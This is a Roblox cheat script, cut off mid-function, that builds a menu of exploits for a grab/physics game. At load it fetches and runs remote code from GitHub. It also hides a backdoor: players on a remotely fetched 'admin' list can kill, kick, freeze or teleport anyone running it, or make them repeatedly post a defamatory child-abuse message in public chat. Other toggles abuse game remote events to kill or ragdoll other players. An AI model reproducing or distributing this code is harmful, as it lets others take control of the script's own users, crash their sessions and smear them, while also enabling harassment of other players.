--foewarded from نلودردررلزز ملرلندولتد

gethui = function()
	return game.CoreGui.RobloxGui
end

local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local Options = Library.Options
local Toggles = Library.Toggles

local TweenService = game:GetService("TweenService")
local Analytics = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local rs = game:GetService("ReplicatedStorage")
local RF = game:GetService("ReplicatedFirst")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local DestroyToy = rs.MenuToys.DestroyToy
local BombExplode = rs.BombEvents.BombExplode
local SetNetOwner = rs.GrabEvents.SetNetworkOwner
local CreateLine = rs.GrabEvents.CreateGrabLine
local DestroyLine = rs.GrabEvents.DestroyGrabLine
local SpawnToy = rs.MenuToys.SpawnToyRemoteFunction
local Struggle = rs.CharacterEvents.Struggle
local Ragdoll = rs.CharacterEvents.RagdollRemote
local StopVel = rs.GameCorrectionEvents.StopAllVelocity
local UpdLineColor = rs.DataEvents.UpdateLineColorsEvent
local StickyEvent = rs.PlayerEvents.StickyPartEvent

local jerkspeed = 0.1
local spinspeed = 10
local strength = 300
local offset = CFrame.new(0, 15, 0)
local PalletForRagdoll
local Seats = {}
local WhitelistEnabled = false

local Lines = 0
local Camera = workspace.CurrentCamera
local plr = Players.LocalPlayer
local Mouse = plr:GetMouse()
local cons = {}
local inv = workspace[plr.Name.."SpawnedInToys"]

local char = plr.Character
local HRP = char.HumanoidRootPart
local hum = char.Humanoid

plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)
	if c then
		HRP = c:FindFirstChild("HumanoidRootPart") or c:WaitForChild("HumanoidRootPart", 1)
		hum = c:FindFirstChild("Humanoid") or c:WaitForChild("Humanoid", 1)
		char = c
	end
end)

local function gblob()
	local char = plr.Character
	local hum = char:WaitForChild("Humanoid", 0.1)
    if hum and hum.SeatPart then
        if hum.SeatPart.Parent.Name == "CreatureBlobman" then
            return hum.SeatPart.Parent
        end
    end
end

local function disc(name)
    for i,v in cons do
        if i == name then
            v:Disconnect()
        end
    end
end

local function getplot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild("Plot"..i)
        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end

local function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end

local function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end
    local t
    local toyadded
    toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c
            toyadded:Disconnect()
        end
    end)
    task.spawn(function()
        SpawnToy:InvokeServer(
            toy,
            cf,
            Vector3.new(0,0,0)
        )
    end)
    local time = tick() + 1
    repeat task.wait() until t or tick() > time
    if t then
        return t
    else
        local plot = getplot()
        if plot then
            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end

local function grab(obj)
    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
end

local function drop(obj, cf)
    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, vector.create(0, 0, 0))
end

local function tp(obj1, obj2)
    obj1.CFrame = CFrame.new(
        obj2.Position + obj2.Velocity *
        (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000) * 5
    )
end

local function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

local function getname(v)
    return v:split(" ")[2]:split("(")[2]:split(")")[1]
end

local function HasProperty(obj, property)
    local ok = pcall(function() if obj[property] then end end)
    return ok
end

local admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/Brovaky/Friendly/refs/heads/main/admins"))()

rs.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(...)
    local args = {...}
    local s = args[1]
    if s and typeof(args[2]) == "string" then
        if table.find(admins, s.Name) then
            local char = plr.Character
            local txt = string.split(args[2], " ")
            local nam = tostring(txt[2]):lower()
            if txt[1] == "!kill" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid.Health = 0
                end
            elseif txt[1] == "!bring" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                local char1 = game.Players:FindFirstChild(s.Name).Character
                if char and char:FindFirstChild("HumanoidRootPart") and char1 and char1:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.CFrame = char1.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                end
            elseif txt[1] == "!kick" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr:Kick("Kicked by posral admin ("..game.Players[s.Name].DisplayName..")")
            elseif txt[1] == "!reveal" and s.Name ~= plr.Name then
                TextChatService.TextChannels.RBXGeneral:SendAsync("Ya Premium Nasral!")
            elseif txt[1] == "!report" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                while task.wait(1) do
                    TextChatService.TextChannels.RBXGeneral:SendAsync("i touch kids")
                end
            elseif txt[1] == "!lag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = true
            elseif txt[1] == "!unlag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = false
            elseif txt[1] == "!crash" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                while true do end
            elseif txt[1] == "!on" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if not Toggles[txt[3]] then return end
                Toggles[txt[3]]:SetValue(true)
            elseif txt[1] == "!off" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if not Toggles[txt[3]] then return end
                Toggles[txt[3]]:SetValue(false)
            elseif txt[1] == "!setfps" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                setfpscap(txt[3])
            end
        end
    end
end)

local Window = Library:CreateWindow({
    Title = "Posral",
    Footer = "version: Иди нахуй не читай",
    NotifySide = "Right",
})

local Tabs = {
	Main = Window:AddTab("Main"),
    Defence = Window:AddTab("Defence"),
    Visual = Window:AddTab("Visual"),
    Target = Window:AddTab("Target"),
    Server = Window:AddTab("Server"),
    Keybinds = Window:AddTab("Keybinds"),
    Whitelist = Window:AddTab("Whitelist"),
	["UI Settings"] = Window:AddTab("UI Settings"),
}
do
    local avatar = Tabs.Visual:AddLeftGroupbox("Just your avatar", "person-standing")

    local avatarview = avatar:AddViewport("Just your avatar", {
        Object = plr.Character,
        Camera = Instance.new("Camera"),
        Interactive = true,
        AutoFocus = true,
        Height = 400,
    })

    plr.CharacterAdded:Connect(function(chara)
        task.wait(1)
        avatarview:SetObject(chara:Clone())
    end)
end
do

local box = Tabs.Visual:AddRightGroupbox("Misc")

box:AddToggle("AntiKickEsp", {
    Text = "Anti Kick Esp",
    Default = false,
    Callback = function(v)
        if v then
            for _,pl in Players:GetPlayers() do
                if pl~=plr then 
                    for i,v in workspace[pl.Name.."SpawnedInToys"]:GetChildren() do
                        if v:FindFirstChild("StickyPart") then
                            local high = Instance.new("Highlight", v)
                            high.Adornee = v
                            if v.StickyPart.StickyWeld.Part1 then
                                high.FillColor = Color3.fromRGB(192, 173, 0)
                            else
                                high.FillColor = Color3.fromRGB(0, 194, 0)
                            end
                            v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(192, 173, 0)
                                else
                                    high.FillColor = Color3.fromRGB(0, 194, 0)
                                end
                            end)
                        end
                    end
                    cons["antikickesp"..pl.Name] = workspace[pl.Name.."SpawnedInToys"].ChildAdded:Connect(function(v)
                        task.wait(0.4)
                        if v:FindFirstChild("StickyPart") then
                            local high = Instance.new("Highlight", v)
                            high.Adornee = v
                            if v.StickyPart.StickyWeld.Part1 then
                                high.FillColor = Color3.fromRGB(192, 173, 0)
                            else
                                high.FillColor = Color3.fromRGB(0, 194, 0)
                            end
                            v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(192, 173, 0)
                                else
                                    high.FillColor = Color3.fromRGB(0, 194, 0)
                                end
                            end)
                        end
                    end)
                end
            end
        else
            for i,v in Players:GetPlayers() do
                if v~=plr then
                    if cons["antikickesp"..v.Name] then cons["antikickesp"..v.Name]:Disconnect() cons["antikickesp"..v.Name] = nil end
                    for i,v in workspace[v.Name.."SpawnedInToys"]:GetChildren() do
                        if v:FindFirstChild("StickyPart") then
                            if v.Parent:FindFirstChild("Highlight") then v.Parent.Highlight:Destroy() end
                        end
                    end
                end
            end
        end
    end
})
box:AddSlider("PCLDTransparency", {
    Text = "Transparency",
    Default = 0.6,
    Min = 0,
    Max = 1,
    Rounding = 1
})

box:AddToggle("ViewPCLD", {
    Text = "View PCLD(off>>on to update)",
    Default = false,
    Callback = function(v)
        if v then
            local trans = Options.PCLDTransparency.Value
            for i,v in pairs(workspace:GetChildren()) do
                if v.Name == "PlayerCharacterLocationDetector" then
                    v.Transparency = trans
                end
            end
            cons["viewpcld"] = workspace.ChildAdded:Connect(function(child)
                if child.Name == "PlayerCharacterLocationDetector" then
                    child.Transparency = trans
                end
            end)
        else
            if cons["viewpcld"] then cons["viewpcld"]:Disconnect() cons["viewpcld"] = nil end
            for i,v in pairs(workspace:GetChildren()) do
                if v.Name == "PlayerCharacterLocationDetector" then
                    v.Transparency = 1
                end
            end
        end
    end
})

end

do
local box = Tabs.Defence:AddLeftGroupbox("Defence")
box:AddToggle("AntiGrab",{
    Text = "Anti Grab",
    Default = false,
    Callback = function(v)
        if v then
            antig = plr.IsHeld.Changed:Connect(function()
                if plr.IsHeld.Value then
                    local plrchar = plr.Character
                    Struggle:FireServer()
                    plrchar.HumanoidRootPart.Anchored = true
                    plrchar.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                    plrchar.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                    repeat Struggle:FireServer() task.wait() until plr.IsHeld.Value ~= true
                    plrchar.HumanoidRootPart.Anchored = false
                end
            end)
        else
            antig:Disconnect()
        end
    end
})
box:AddToggle("AutoReset", {
    Text = "Auto Reset",
    Default = false,
    Callback = function(v)
        if v then
            cons["AutoReset"] = rs.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == "Flying" then
                    Library:Notify("Reset", 4)
                    hum:ChangeState("Dead")
                end
            end)
        else
            if cons["AutoReset"] then cons["AutoReset"]:Disconnect() end
        end
    end
})
Toggles.AutoReset:SetValue(true)
box:AddToggle("AntiInput", {
    Text = "Anti Input Lag",
    Default = false,
    Callback = function(v)
        antiinputlag = v
        if antiinputlag then
            local burger = inv:FindFirstChild("FoodCoconut") or spawntoy("FoodCoconut", HRP.CFrame)
            burger.Name = "burger"
            task.wait(0.2)
            spawn(function()
                while antiinputlag and task.wait() do
                    task.spawn(function()
                        grab(burger)
                    end)
                    task.wait(0.1)
                    task.spawn(function()
                        drop(burger, CFrame.new(0, 1e9, 0))
                    end)
                    if (burger.HoldPart.RigidConstraint.Attachment1 and burger.HoldPart.RigidConstraint.Attachment1 ~= plr.Character["Left Arm"].LeftGripAttachment) or (not burger or not burger.Parent) then
                        if inv:FindFirstChild("burger") then
                            DestroyToy:FireServer(inv.burger)
                        end
                        burger = spawntoy("FoodCoconut", HRP.CFrame)
                        repeat task.wait() until burger
                        burger.Name = "burger"
                    end
                end
            end)
        end
    end
})
box:AddToggle("AntiPaint", {
    Text = "Anti Paint",
    Default = false,
    Callback = function(v)
        if v then
			antipcon = workspace.DescendantAdded:Connect(function(d)
				if d.Name == "PaintPlayerPart" then
					task.wait(0.1)
					d:Destroy()
				end
			end)
			for i, v in pairs(workspace:GetDescendants()) do
				if v.Name == "PainPlayerPart" then
					v:Destroy()
				end
			end
		else
			if antipcon then
				antipcon:Disconnect()
			end
		end
    end
})
box:AddToggle("GucciTractor", {
    Text = "Gucci(Invisible)",
    Default = false,
    Callback = function(v)
        if v then
            local blobb
            pcall(function()
                local pal, pal2
                pal2 = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
                    if c.Name == "TractorGreen" then
                        pal = c
                        task.wait()
                        pal2:Disconnect()
                        pal2 = nil
                    end
                end)
                spawn(function()
                    task.wait(1)
                    local mess = pal.ViewItemButton.NewMessage:Clone()
                    mess.Name = "Gucci2"
                    mess.TextColor3 = Color3.fromRGB(255, 255, 255)
                    mess.Text = "Anti Gucci"
                    mess.Visible = true
                    mess.Parent = pal.ViewItemButton
                end)
            end)
            blobb = spawntoy("TractorGreen", HRP.CFrame * CFrame.new(5, 5, 20))
            blobb.Name = "tractorgucci"
            repeat task.wait() until blobb
            blobb:WaitForChild("VehicleSeat", 3):Sit(plr.Character.Humanoid)
            task.spawn(function()
                local endTime = tick() + 3
                while tick() < endTime do
                    Ragdoll:FireServer(HRP, 0)
                    task.wait()
                end
            end)
            task.wait()
            while blobb.VehicleSeat.Occupant ~= plr.Character.Humanoid do task.wait() end
            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            sno(blobb.Part)
            task.wait(0.2)
            blobb.VehicleSeat.CFrame = CFrame.new(0, 0/0, 0)
        else
            DestroyToy:FireServer(inv.tractorgucci)
            for i = 1, 30 do
                hum.Sit = true
                task.wait()
                hum.Sit = false
            end
        end
    end
})

box:AddToggle("GucciTrain", {
    Text = "Gucci(Train)",
    Default = false,
    Callback = function(v)
        if v then
            local pos = HRP.CFrame
            workspace.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel.Seat:Sit(hum)
            task.spawn(function()
                local endTime = tick() + 3
                while tick() < endTime do
                    Ragdoll:FireServer(HRP, 0)
                    task.wait()
                end
            end)
            task.wait(0.2)
            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait(0.2)
            HRP.CFrame = pos
        else
            for i = 1, 30 do
                hum.Sit = true
                task.wait()
                hum.Sit = false
            end
        end
    end
})

box:AddToggle("GucciBlobman", {
    Text = "Gucci(Blobman)",
    Default = false,
    Callback = function(v)
        if v then
            local blobb
            pcall(function()
                local pal, pal2
                pal2 = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
                    if c.Name == "CreatureBlobman" then
                        pal = c
                        task.wait()
                        pal2:Disconnect()
                        pal2 = nil
                    end
                end)
                spawn(function()
                    task.wait(1)
                    local mess = pal.ViewItemButton.NewMessage:Clone()
                    mess.Name = "Gucci1"
                    mess.TextColor3 = Color3.fromRGB(255, 255, 255)
                    mess.Text = "Anti Gucci"
                    mess.Visible = true
                    mess.Parent = pal.ViewItemButton
                end)
            end)
            blobb = spawntoy("CreatureBlobman", HRP.CFrame * CFrame.new(5, 5, 20))
            repeat task.wait() until blobb
            blobb:WaitForChild("VehicleSeat", 3):Sit(plr.Character.Humanoid)
            task.spawn(function()
                local endTime = tick() + 3
                while tick() < endTime do
                    Ragdoll:FireServer(HRP, 0)
                    task.wait()
                end
            end)
            task.wait()
            while blobb.VehicleSeat.Occupant ~= plr.Character.Humanoid do task.wait() end
            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait()
            blobb.VehicleSeat.CFrame = CFrame.new(0, 0/0, 0)
        else
            DestroyToy:FireServer(inv.CreatureBlobman)
            for i = 1, 30 do
                hum.Sit = true
                task.wait()
                hum.Sit = false
            end
        end
    end
})

box:AddToggle("AutoGucciBlob", {
    Text = "Auto Gucci(blobman)",
    Default = false,
    Callback = function(v)
        autogucci = v
        if v then
            local function gucci()
                if not autogucci then return end
                local blobb
                repeat task.wait() until plr.IsHeld.Value == false
                hum.Sit = true
                task.wait(0.1)
                hum.Sit = false
                pcall(function()
                    local pal, pal2
                    pal2 = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
                        if c.Name == "CreatureBlobman" then
                            pal = c
                            task.wait()
                            pal2:Disconnect()
                            pal2 = nil
                        end
                    end)
                    spawn(function()
                        task.wait(1)
                        local mess = pal.ViewItemButton.NewMessage:Clone()
                        mess.Name = "Gucci1"
                        mess.TextColor3 = Color3.fromRGB(255, 255, 255)
                        mess.Text = "Anti Gucci"
                        mess.Visible = true
                        mess.Parent = pal.ViewItemButton
                    end)
                end)
                if inv:FindFirstChild("autogucci") then DestroyToy:FireServer(inv.autogucci) end
                blobb = spawntoy("CreatureBlobman", HRP.CFrame * CFrame.new(5, 5, 20))
                repeat task.wait() until blobb
                blobb.Name = "autogucci"
                blobb:WaitForChild("VehicleSeat", 3):Sit(plr.Character.Humanoid)
                task.spawn(function()
                    local endTime = tick() + 3
                    while tick() < endTime do
                        Ragdoll:FireServer(HRP, 0)
                        task.wait()
                    end
                end)
                cons["autogucci"] = blobb.Destroying:Once(function()
                    gucci()
                end)
                task.wait()
                while blobb.VehicleSeat.Occupant ~= plr.Character.Humanoid do task.wait() end
                plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                task.wait()
                repeat task.wait() sno(blobb.RightDetector) until blobb.Head:FindFirstChild("PartOwner")
                task.wait(0.1)
                blobb.VehicleSeat.CFrame = CFrame.new(0, 0/0, 0)
            end
            task.spawn(function()
                while autogucci and task.wait(0.1) do
                    if hum:GetState() == Enum.HumanoidStateType.Dead or not isnetworkowner(HRP) or not inv:FindFirstChild("autogucci") or plr.IsHeld.Value then
                        gucci()
                    end
                end
            end)
        else
            if cons["autogucci"] then 
                cons["autogucci"]:Disconnect() 
                cons["autogucci"] = nil
            end
            DestroyToy:FireServer(inv.autogucci)
            for i = 1, 30 do
                hum.Sit = true
                task.wait()
                hum.Sit = false
            end
        end
    end
})

box:AddToggle("AntiKill", {
    Text = "Anti Loop Kill",
    Default = false,
    Callback = function(v)
        if v then
            cons["antiloopkill"] = plr.CharacterAdded:Connect(function(char)
                local hrp = char:WaitForChild("HumanoidRootPart")
                hrp.CFrame = CFrame.new(524.7039794921875, 93.71200561523438, -375.0409851074219)
            end)
        else
            disc("antiloopkill")
        end
    end
})

box:AddToggle("AntiKick", {
    Text = "Anti Kick",
    Default = false,
    Callback = function(v)
        task.wait(0.1)
        antikick = v
        if antikick then
            task.spawn(function()
                task.wait(0.1)
                if not inv:FindFirstChild("NinjaShuriken1") then
                    repeat task.wait() until plr.CanSpawnToy.Value
                    local shu
                    local part
                    local plot = getplot()
                    while antikick and task.wait() do
                        pcall(function()
                            local char = plr.Character
                            if not shu or not inv:FindFirstChild("NinjaShuriken1") and not workspace.PlotItems:FindFirstChild("NinjaShuriken1", true) then
                                print(1)
                                shu = spawntoy("NinjaShuriken", HRP.CFrame * CFrame.new(5, 10, 20))
                                shu.Name = "NinjaShuriken1"
                                part = shu:WaitForChild("StickyPart", 0.3)
                                sno(part)
                            end
                            if shu and shu:FindFirstChild("StickyPart") and shu.StickyPart:FindFirstChild("PartOwner") and shu.StickyPart:FindFirstChild("PartOwner").Value ~= plr.Name then
                                print(2)
                                sno(part)
                            end
                            if part and part:FindFirstChild("StickyWeld") and part.StickyWeld.Part1 ~= char.HumanoidRootPart.FirePlayerPart then
                                print(3)
                                sno(part)
                                StickyEvent:FireServer(part, char.HumanoidRootPart.FirePlayerPart, CFrame.new(0,0,0,1,0,0,0,0,-1,0,1,0))
                            end
                            task.wait(0.2)
                            if shu and shu:FindFirstChild("StickyPart") and (part.Position - HRP.Position).Magnitude > 30 then
                                print(4)
                                DestroyToy:FireServer(inv.NinjaShuriken1)
                                shu = spawntoy("NinjaShuriken", HRP.CFrame * CFrame.new(5, 10, 20))
                                shu.Name = "NinjaShuriken1"
                                sno(part)
                            end
                        end)
                    end
                end
            end)
        else
            if inv:FindFirstChild("NinjaShuriken1") then DestroyToy:FireServer(inv.NinjaShuriken1) end
        end
    end
})

box:AddToggle("LoopTp", {
    Text = "Loop Tp",
    Default = false,
    Callback = function(v)
        looptp = v
        local pos = HRP.CFrame
        if v then
            task.wait(0.1)
            task.spawn(function()
                while looptp and task.wait(0.05) do
                    HRP.CFrame = pos * CFrame.new(math.random(-1000, 1000), 0, math.random(-1000, 1000))
                    stvel(HRP)
                end
            end)
        else
            stvel(HRP)
            task.wait(0.1)
            HRP.CFrame = pos
        end
    end
})

box:AddToggle("AntiBurn", {
    Text = "Anti Burn",
    Default = false,
    Callback = function(v)
        if v then
			antiburn1 = plr.CharacterAdded:Connect(function(ch)
				if antiburn then
					antiburn:Disconnect()
                end
				antiburn = ch:WaitForChild("Humanoid", 0.5).FireDebounce.Changed:Connect(function()
					if ch:WaitForChild("Humanoid", 0.5).FireDebounce.Value == true then
                        local bar = workspace.Plots.Plot1.Barrier.PlotBarrier
                        local pos = bar.CFrame
						task.spawn(function()
							repeat task.wait() bar.CFrame = HRP.CFrame until not hum.FireDebounce.Value
						end)
                        task.wait(1)
                        ch:WaitForChild("Humanoid", 0.5).FireDebounce.Value = false
                        task.wait()
                        bar.CFrame = pos
                    end
                end)
            end)
            antiburn = plr.Character.Humanoid.FireDebounce.Changed:Connect(function()
                if plr.Character.Humanoid.FireDebounce.Value == true then
                    local bar = workspace.Plots.Plot1.Barrier.PlotBarrier
                    local pos = bar.CFrame
					task.spawn(function()
                    	repeat task.wait() bar.CFrame = HRP.CFrame until not hum.FireDebounce.Value
					end)
                    task.wait(1)
                    plr.Character.Humanoid.FireDebounce.Value = false
                    task.wait()
                    bar.CFrame = pos
                end
            end)
        else
            if antiburn then antiburn:Disconnect() end
            if antiburn1 then antiburn1:Disconnect() end
        end
    end
})

box:AddToggle("AntiBlobman", {
    Text = "Anti Blobman",
    Default = false,
    Callback = function(v)
        if v then
            for i,v in pairs(workspace:GetDescendants()) do
                if v.Name == "CreatureBlobman" and not v:IsDescendantOf(inv) then 
                    local rd, ld = v:FindFirstChild("RightDetector") or v:WaitForChild("RightDetector", 3), v:FindFirstChild("LeftDetector") or v:WaitForChild("LeftDetector", 3)
                    if rd and ld then 
                        rd.RightAlignOrientation.Enabled = false
                        rd.RightWeld.Enabled = false
                        ld.LeftAlignOrientation.Enabled = false
                        ld.LeftWeld.Enabled = false
                    end
                end
            end
            cons["antiblob"] = workspace.DescendantAdded:Connect(function(d)
                if d.Name == "CreatureBlobman" and (not inv or not d:IsDescendantOf(inv)) then 
                    local rd = d:FindFirstChild("RightDetector") or d:WaitForChild("RightDetector", 3)
                    local ld = d:FindFirstChild("LeftDetector") or d:WaitForChild("LeftDetector", 3)

                    if rd and ld then
                        local rao = rd:WaitForChild("RightAlignOrientation", 1)
                        local rw  = rd:WaitForChild("RightWeld", 1)
                        local lao = ld:WaitForChild("LeftAlignOrientation", 1)
                        local lw  = ld:WaitForChild("LeftWeld", 1)

                        if rao then rao.Enabled = false end
                        if rw  then rw.Enabled  = false end
                        if lao then lao.Enabled = false end
                        if lw  then lw.Enabled  = false end
                    end
                end
            end)
        else
            if cons["antiblob"] then cons["antiblob"]:Disconnect() end
        end
    end
})

box:AddButton("Delete Legs", function()
        if char:FindFirstChild("Left Leg") and char:FindFirstChild("Right Leg") then
            local ll = char:FindFirstChild("Left Leg")
            local rl = char:FindFirstChild("Right Leg")
            local void = workspace.FallenPartsDestroyHeight
            local pos = char.Torso.CFrame
            workspace.FallenPartsDestroyHeight = -100
            Ragdoll:FireServer(HRP, 2)
            task.wait(0.5)
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
            task.wait(0.3)
            char.Torso.CFrame = CFrame.new(0, -9970, 0)
            task.wait(0.5)
            char.Torso.CFrame = pos
            task.wait(0.5)
            workspace.FallenPartsDestroyHeight = void
            task.spawn(function()
                if not char:FindFirstChild("Left Leg") and not char:FindFirstChild("Right Leg") then
                    while task.wait() do
                        if plr.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                            char.Humanoid.HipHeight = 2
                        else
                            char.Humanoid.HipHeight = 0
                        end
                    end
                end
            end)
        end
    end
)

box:AddToggle("AntiLag", {
    Text = "Anti Lag",
    Default = false,
    Callback = function(v)
        Lines = 0
        plr.PlayerScripts.CharacterAndBeamMove.Enabled = not v
    end
})

local lagger
box:AddToggle("AutoAntiLag", {
    Text = "Auto Anti Lag",
    Default = false,
    Callback = function(v)
        autoantilag = v
        if v then
            task.spawn(function()
                while autoantilag and task.wait() do
                    if Lines > 100 then
                        plr.PlayerScripts.CharacterAndBeamMove.Enabled = false
                        Library:Notify({
                            Title = "Auto Anti Lag Notify",
                            Description = lagger.Name.." Lagged Server",
                            Time = 6.5,
                        })
                        Lines = 0
                    end
                end
            end)
        else
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
        end
    end
})
workspace.DescendantAdded:Connect(function(d)
    if d.Name == "GrabBeam" then
        Lines += 1
        lagger = d.Parent.Parent.Parent
    end
end)

box:AddToggle("AntiSticky", {
    Text = "Anti Sticky",
    Default = false,
    Callback = function(v)
        plr.PlayerScripts.StickyPartsTouchDetection.Enabled = not v
    end
})

box:AddToggle("AntiExplode", {
    Text = "Anti Explode",
    Default = false,
    Callback = function(v)
        if v then
            cons["antiexp"] = workspace.ChildAdded:Connect(function(c)
                if c.Name == "Part" then
                    if (c.Position - HRP.Position).Magnitude < 40 and plr.Character.Humanoid.Ragdolled.Value == true then
						HRP.Anchored = true
                        task.wait(0.01)
                        HRP.Anchored = false
                        stvel(HRP)
                        hum:ChangeState(Enum.HumanoidStateType.Running)
                    end
                end
            end)
		else
			if cons["antiexp"] then cons["antiexp"]:Disconnect() end
        end
    end
})

box:AddToggle("AntiVoid", {
    Text = "Anti Void",
    Default = false,
    Callback = function(v)
        if v then
            workspace.FallenPartsDestroyHeight = 0/0
        else
            workspace.FallenPartsDestroyHeight = -100
        end
    end
})

end

do

local box = Tabs.Main:AddLeftGroupbox("Combat")

box:AddToggle("SuperStrength", {
    Text = "Super Strength",
    Default = false,
    Callback = function(v)
        if v then
            local obj
            cons["supstrgetobj"] = workspace.ChildAdded:Connect(function(c)
                if c.Name == "GrabParts" then
                    local part = c:FindFirstChild("GrabPart") or c:WaitForChild("GrabPart", 1)
                    if part then
                        local weld = part:FindFirstChild("WeldConstraint") or part:WaitForChild("WeldConstraint", 1)
                        if weld then
                            obj = weld.Part1
                        end
                    end
                end
            end)
			cons["dplrobj"] = workspace.ChildRemoved:Connect(function(c)
				task.wait()
				if c.Name == "GrabParts" then
					obj = nil
				end
			end)
            cons["superstrength"] = UserInputService.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                    if obj then
                        local bv = Instance.new("BodyVelocity", obj)
						bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        bv.Velocity = Camera.CFrame.LookVector * strength
						obj = nil
					end
                end
            end)
        else
            if cons["supstrgetobj"] then cons["supstrgetobj"]:Disconnect() end
            if cons["superstrength"] then cons["superstrength"]:Disconnect() end
            if cons["dplrobj"] then cons["dplrobj"]:Disconnect() end
        end
    end
})

box:AddToggle("KillGrab", {
    Text = "Kill Grab",
    Default = false,
    Callback = function(v)
        if v then
            cons["KillGrab"] = workspace.ChildAdded:Connect(function(c)
                if c.Name == "GrabParts" then
                    local part = c:FindFirstChild("GrabPart") or c:WaitForChild("GrabPart", 1)
                    if part then
                        local weld = part:FindFirstChild("WeldConstraint") or part:WaitForChild("WeldConstraint", 1)
                        if weld and weld.Part1.Parent:FindFirstChild("HumanoidRootPart") then
                            weld.Part1.Parent.Humanoid:ChangeState("Dead")
                            task.wait(0.1)
                            DestroyLine:FireServer(weld.Part1)
                        end
                    end
                end
            end)
        else
            if cons["KillGrab"] then cons["KillGrab"]:Disconnect() end
        end
    end
})

box:AddToggle("MasslessGrab", {
    Text = "Massless Grab",
    Default = false,
    Callback = function(v)
        if v then
            cons["masslessgrab"] = workspace.ChildAdded:Connect(function(c)
                if c.Name == "GrabParts" then
                    local part = c:FindFirstChild("DragPart") or c:WaitForChild("DragPart", 1)
                    if part then
                        local pos, ori = part:FindFirstChild("AlignPosition") or part:WaitForChild("AlignPosition", 1), part:FindFirstChild("AlignOrientation") or part:WaitForChild("AlignOrientation", 1)
                        if pos and ori then
                            pos.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                            pos.MaxForce = math.huge
                            pos.Responsiveness = 200
                            ori.Responsiveness = 200
                            ori.MaxTorque = math.huge
                        end
                    end
                end
            end)
        else
            if cons["masslessgrab"] then cons["masslessgrab"]:Disconnect() end
        end
    end
})

box:AddToggle("SpinGrab", {
    Text = "Spin Grab",
    Default = false,
    Callback = function(v)
        spingrab = v
        if spingrab then
            local char = plr.Character or plr.CharacterAdded:Wait()
            local hrp = char:WaitForChild("HumanoidRootPart")

            cons["spingrabConnection"] = workspace.ChildAdded:Connect(function(e)
